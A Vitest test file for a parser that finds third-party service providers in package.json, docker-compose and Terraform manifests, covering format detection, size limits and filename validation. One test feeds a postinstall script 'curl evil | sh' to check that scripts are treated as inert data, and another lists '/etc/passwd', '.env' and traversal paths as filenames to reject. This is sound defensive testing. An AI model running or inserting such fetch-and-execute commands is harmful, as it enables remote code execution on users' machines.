import { readFileSync } from "node:fs";
import { join, resolve } from "node:path";
import { describe, expect, it } from "vitest";
import { SAMPLE_REPO_FILES } from "@/fixtures/sample-repo";
import { MAX_MANIFEST_BYTES, MAX_MANIFEST_LINES, ManifestError, detectFormat, parseManifest } from "@/lib/providers/manifest-import";
import { imageRepository } from "@/lib/providers/taxonomy";

const SAMPLE_DIR = resolve(__dirname, "../../src/fixtures/sample-repo/incident-monitoring");
const fail = (file: { filename: string; content: string }) => {
  try {
    parseManifest(file);
  } catch (e) {
    expect(e).toBeInstanceOf(ManifestError);
    return (e as ManifestError).code;
  }
  throw new Error("expected ManifestError");
};
const pkg = (deps: Record<string, unknown>, extra: Record<string, unknown> = {}) =>
  JSON.stringify({ name: "x", dependencies: deps, ...extra });

describe("sample repo", () => {
  it("embedded sample files are byte-identical to the fixture files on disk", () => {
    for (const f of SAMPLE_REPO_FILES) expect(f.content, f.filename).toBe(readFileSync(join(SAMPLE_DIR, f.filename), "utf8"));
  });
});

describe("package.json", () => {
  it("known dependency -> provider match; unknown -> null; devDependencies ignored", () => {
    const sample = parseManifest(SAMPLE_REPO_FILES.find((f) => f.filename === "package.json")!);
    expect(sample.format).toBe("PACKAGE_JSON");
    expect(sample.findings.map((f) => [f.token, f.version, f.provider?.id ?? null])).toEqual([
      ["@cloudcomms/sdk", "^3.2.0", "cloudcomms"],
      ["express", "^4.19.2", null],
      ["pino", "^9.0.0", null],
      ["twilio", "^5.0.0", "twilio"],
    ]);
    expect(sample.findings.some((f) => f.token === "@webhookworks/client")).toBe(false);
    expect(sample.findings.find((f) => f.token === "twilio")!.provider).toMatchObject({ category: "SMS provider", vendorKey: null, fictional: false });
  });

  it("no dependency -> no findings", () => {
    expect(parseManifest({ filename: "package.json", content: '{"name":"x"}' }).findings).toEqual([]);
    expect(parseManifest({ filename: "package.json", content: pkg({}) }).findings).toEqual([]);
  });

  it("optional and peer dependencies count", () => {
    const r = parseManifest({ filename: "package.json", content: JSON.stringify({ optionalDependencies: { stripe: "1" }, peerDependencies: { "dd-trace": "5" } }) });
    expect(r.findings.map((f) => f.provider?.id)).toEqual(["stripe", "datadog"]);
  });

  it("malformed input is rejected", () => {
    expect(fail({ filename: "package.json", content: "{" })).toBe("MALFORMED");
    expect(fail({ filename: "package.json", content: "[1,2]" })).toBe("MALFORMED");
    expect(fail({ filename: "package.json", content: "null" })).toBe("MALFORMED");
    expect(fail({ filename: "package.json", content: JSON.stringify({ dependencies: ["twilio"] }) })).toBe("MALFORMED");
    expect(fail({ filename: "package.json", content: pkg({ twilio: 5 }) })).toBe("MALFORMED");
  });

  it("scripts are data, never executed or reported", () => {
    const r = parseManifest({ filename: "package.json", content: pkg({ twilio: "5" }, { scripts: { postinstall: "curl evil | sh" } }) });
    expect(r.findings.map((f) => f.token)).toEqual(["twilio"]);
  });
});

describe("limits and safety", () => {
  it("oversize input is rejected (bytes and lines)", () => {
    expect(fail({ filename: "package.json", content: " ".repeat(MAX_MANIFEST_BYTES + 1) })).toBe("TOO_LARGE");
    expect(fail({ filename: "docker-compose.yml", content: "\n".repeat(MAX_MANIFEST_LINES + 1) })).toBe("TOO_LARGE");
    expect(parseManifest({ filename: "package.json", content: pkg({}) + " ".repeat(1000) }).bytes).toBeLessThan(MAX_MANIFEST_BYTES);
  });

  it("binary content is rejected", () => {
    expect(fail({ filename: "main.tf", content: 'provider "x" {}\u0000' })).toBe("BINARY_CONTENT");
  });

  it("paths are rejected; only known manifest formats are accepted", () => {
    for (const filename of ["../package.json", "a/package.json", "/etc/passwd", "..", ".env", "C:\\x\\package.json"]) {
      expect(fail({ filename, content: "{}" }), filename).toBe("INVALID_FILENAME");
    }
    for (const filename of ["requirements.txt", "Dockerfile", "package-lock.json", "values.yaml", "pom.xml"]) {
      expect(fail({ filename, content: "x" }), filename).toBe("UNSUPPORTED_FORMAT");
    }
    expect(detectFormat("compose.yaml")).toBe("DOCKER_COMPOSE");
    expect(detectFormat("docker-compose.prod.yml")).toBe("DOCKER_COMPOSE");
    expect(detectFormat("network.tf")).toBe("TERRAFORM");
  });
});

describe("docker-compose", () => {
  it("bounded line scan for image references", () => {
    const r = parseManifest(SAMPLE_REPO_FILES.find((f) => f.filename === "docker-compose.yml")!);
    expect(r.findings.map((f) => [f.token, f.version, f.line, f.provider?.id ?? null])).toEqual([
      ["webhookworks/agent:2.1", "2.1", 8, "webhookworks"],
      ["postgres:16", "16", 10, null],
    ]);
  });

  it("counts image lines it cannot resolve (anchors, aliases, templates) instead of guessing", () => {
    const r = parseManifest({
      filename: "compose.yml",
      content: "x-img: &img webhookworks/agent:2\nservices:\n  a:\n    image: *img\n  b:\n    image: ${REGISTRY}/cloudcomms/sms:1\n  c:\n    image: datadog/agent:7\n",
    });
    expect(r.findings.map((f) => f.token)).toEqual(["datadog/agent:7"]);
    expect(r.unparsedReferences).toBe(2);
    expect(parseManifest(SAMPLE_REPO_FILES.find((f) => f.filename === "docker-compose.yml")!).unparsedReferences).toBe(0);
  });

  it("strips registry, tag and digest to match providers", () => {
    expect(imageRepository("registry.example.com:5000/webhookworks/agent:2.1")).toBe("webhookworks/agent");
    expect(imageRepository("webhookworks/agent@sha256:abc")).toBe("webhookworks/agent");
    expect(imageRepository("datadog/agent")).toBe("datadog/agent");
    const r = parseManifest({ filename: "compose.yml", content: "services:\n  a:\n    image: ghcr.io/webhookworks/agent:1 # comment\n  b:\n    image: datadog/agent:7\n" });
    expect(r.findings.map((f) => f.provider?.id)).toEqual(["webhookworks", "datadog"]);
  });
});

describe("terraform", () => {
  it("finds required_providers sources (with version) and provider blocks", () => {
    const r = parseManifest(SAMPLE_REPO_FILES.find((f) => f.filename === "main.tf")!);
    expect(r.findings.map((f) => [f.token, f.version, f.line, f.provider?.id ?? null])).toEqual([
      ["computeharbor/computeharbor", "~> 2.0", 5, "computeharbor"],
      ["computeharbor", null, 11, "computeharbor"],
    ]);
  });

  it("ignores resources and unknown providers safely", () => {
    const r = parseManifest({ filename: "x.tf", content: 'resource "twilio_api" "x" {}\nprovider "aws" {}\n' });
    expect(r.findings.map((f) => [f.token, f.provider])).toEqual([["aws", null]]);
  });
});
